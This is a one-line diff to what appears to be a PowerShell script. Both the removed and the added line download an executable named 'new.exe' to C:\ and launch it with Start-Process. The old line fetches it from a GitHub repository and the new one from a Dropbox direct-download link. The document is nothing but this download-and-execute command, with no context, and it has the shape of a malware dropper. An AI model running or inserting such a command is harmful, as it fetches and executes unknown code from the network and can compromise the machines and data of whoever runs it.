@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://github.com/mo1sss/sss/blob/main/new.exe" -OutFile "C:\new.exe"; Start-Process -FilePath "C:\new.exe";
+Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/uu9ufmaf5v7tdxuy3dfri/new.exe?rlkey=4gvd1uerss2tio3j1pmf10d7d&st=8m55iobl&dl=1" -OutFile "C:\new.exe"; Start-Process -FilePath "C:\new.exe";
